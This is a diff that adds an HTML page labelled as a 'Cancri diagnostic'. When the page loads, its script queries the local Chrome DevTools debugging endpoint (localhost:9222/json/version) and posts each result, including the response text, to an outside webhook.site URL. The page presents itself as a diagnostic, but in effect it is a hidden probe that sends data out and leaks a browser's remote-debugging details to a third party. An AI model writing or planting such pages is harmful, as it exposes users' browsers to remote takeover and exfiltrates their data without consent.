@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Cancri diagnostic</title>
+</head>
+
+<body>
+    <h1>Cancri diagnostic</h1>
+    <pre id="out">Starting test...</pre>
+    <script>
+        const out = document.getElementById("out");
+        const log = (x) => {
+            out.textContent += "\n" + x;
+            fetch("https://webhook.site/96a9c841-170a-46a1-aca9-db43dee912a8", {
+                method: "POST",
+                mode: "no-cors",
+                body: String(x)
+            }).catch(() => { });
+        };
+
+        (async () => {
+            out.textContent = "";
+            try {
+                const r = await fetch("http://localhost:9222/json/version");
+                log("DevTools HTTP status: " + r.status);
+                log(await r.text());
+            } catch (e) {
+                log("DevTools fetch failed: " + e);
+            }
+        })();
+    </script>
+</body>
+
+</html>
